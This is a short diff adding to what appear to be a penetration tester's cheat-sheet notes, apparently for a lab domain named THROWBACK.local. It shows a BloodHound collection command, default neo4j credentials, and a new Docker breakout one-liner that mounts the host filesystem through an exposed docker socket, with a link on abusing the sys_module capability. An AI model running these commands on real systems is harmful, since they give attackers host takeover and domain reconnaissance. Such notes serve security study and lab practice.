@@ -489,3 +489,9 @@ public class testprog {
 Invoke-Bloodhound -CollectionMethod All -Domain THROWBACK.local -ZipFileName loot.zip 
 * start the server
 neo4j:root
+
+[docker breakout]
+* use external docker.dock
+docker -H unix:///tmp/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh
+* sys_module capabilities
+https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd
